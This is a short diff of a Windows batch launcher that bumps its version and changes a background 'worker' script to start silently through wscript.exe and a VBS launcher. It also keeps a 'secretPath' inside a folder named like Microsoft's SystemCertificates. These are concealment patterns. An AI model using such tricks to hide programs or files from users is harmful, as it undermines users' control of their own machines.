@@ -1,4 +1,4 @@
-set "LAUNCHER_VERSION=1.2"
+set "LAUNCHER_VERSION=1.3"
 set "LAUNCHER_VERSION_URL=https://raw.githubusercontent.com/escola-iracema/isrs/main/launcher_version.txt"
 
 set "secretPath=%LOCALAPPDATA%\Microsoft\SystemCertificates"
@@ -52,7 +52,7 @@ if %errorlevel% neq 0 (
 )
 
 if exist "%workerScriptPath%" (
-    start "" /B /high "%workerScriptPath%"
+    start "" /B wscript.exe "%vbsLauncherPath%" "%workerScriptPath%"
 )
 
 :eof
